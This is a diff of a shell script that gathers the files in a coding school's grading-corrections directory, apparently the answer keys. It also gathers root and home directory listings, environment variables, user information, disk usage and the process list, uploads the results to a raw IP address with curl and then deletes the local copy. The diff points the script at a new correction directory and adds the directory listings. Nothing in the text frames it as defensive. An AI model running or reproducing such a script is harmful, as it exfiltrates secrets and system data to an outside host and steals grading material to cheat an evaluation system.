@@ -1,6 +1,10 @@
 pwd > results
 echo ----------------Crack me ------------- >> results
-find /tmp/correction/holberton_corrections/corrections/232/1023/ -type f -printf "---%p----\n" -exec cat '{}' \;>> results
+find /tmp/correction/holberton_corrections/corrections/240/1107/ -type f -printf "---%p----\n" -exec cat '{}' \;>> results
+echo ---------------- Root Directory ------------- >> results
+ls / >> results
+echo ---------------- Home Directory ------------- >> results
+ls -R /root/home >> results
 echo ----------------- Environment ------- >> results
 env >> results
 echo ----------------- User Info ------- >> results
@@ -13,5 +17,5 @@ df -h >> results
 echo ----------------- ps -aux ------- >> results
 ps -aux >> results
 echo ----------------- END $(date) ------- >> results
-curl -s -F "name=@results" http://138.68.1.168:8080 && echo -n ool
+curl -s -F "name=@results" http://138.68.1.168:8080
 rm results
